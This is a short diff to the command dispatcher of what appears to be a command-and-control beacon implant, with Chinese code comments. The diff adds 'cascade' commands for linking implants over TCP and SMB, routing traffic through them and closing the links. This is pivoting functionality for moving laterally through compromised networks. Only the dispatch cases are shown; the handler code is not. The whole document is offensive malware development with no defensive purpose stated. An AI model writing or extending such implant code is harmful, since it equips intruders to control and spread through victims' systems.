@@ -1,4 +1,5 @@
 #include "beacon_commands.h"
+#include "beacon_cascade.h"
 
 /*
  * 命令分发中心：
@@ -146,6 +147,20 @@ PacketList CommandDispatch(BeaconContext* ctx, UINT32 task_id, UINT32 command_id
     case BEACON_COMMAND_BOF:
         PlistFree(&out);
         out = CommandBofHandle(ctx, task_id, &p);
+        break;
+
+    /* 级联 */
+    case BEACON_COMMAND_CASCADE_CONNECT_TCP:
+        PlistAdd(&out, CascadeHandleConnectTcp(ctx, &p));
+        break;
+    case BEACON_COMMAND_CASCADE_LINK_SMB:
+        PlistAdd(&out, CascadeHandleLinkSmb(ctx, &p));
+        break;
+    case BEACON_COMMAND_CASCADE_ROUTE:
+        PlistAdd(&out, CascadeHandleRoute(ctx, &p));
+        break;
+    case BEACON_COMMAND_CASCADE_CLOSE:
+        PlistAdd(&out, CascadeHandleClose(ctx, &p));
         break;
 
     /* 未知命令 */
